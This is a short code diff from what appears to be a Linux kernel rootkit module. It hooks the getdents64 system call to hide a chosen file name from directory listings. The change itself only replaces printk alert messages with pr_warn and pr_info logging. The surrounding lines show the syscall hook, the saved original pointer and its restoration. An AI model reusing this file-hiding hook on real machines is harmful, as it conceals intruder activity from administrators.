@@ -22,7 +22,7 @@ int new_getdents64(const struct pt_regs *regs) {
 
         int copy_res = copy_from_user(first, buf_pointer, (unsigned long)total_bytes_read);
         if (copy_res) {
-            printk(KERN_ALERT "Error while copying from user space! error %d", copy_res);
+            pr_warn("Error while copying from user space! error %d", copy_res);
             return total_bytes_read;
         }
 
@@ -58,9 +58,9 @@ int new_getdents64(const struct pt_regs *regs) {
 }
  
 int load(void) {
-    printk(KERN_ALERT "Initializing...");
+    pr_info("Initializing...");
     if (file_name_to_hide == NULL) {
-        printk(KERN_ALERT "File name to hide has not been set! Exiting...");
+        pr_warn("File name to hide has not been set! Exiting...");
         return -1;
     }
 
@@ -70,15 +70,15 @@ int load(void) {
     }
     
     original_getdents64_ptr = (original_getdents64_t)getdents_ptr;
-    printk(KERN_ALERT "Initialized successfuly!");
+    pr_info("Initialized successfuly!");
 
     return 0;
 }
  
 void unload(void) {
-    printk(KERN_ALERT "Shutting down.");
+    pr_info("Shutting down.");
     restore_syscall(__NR_getdents64, (unsigned long)original_getdents64_ptr);
-    printk(KERN_ALERT "Goodbye world...");
+    pr_info("Goodbye world...");
 }
 
 module_init(load);
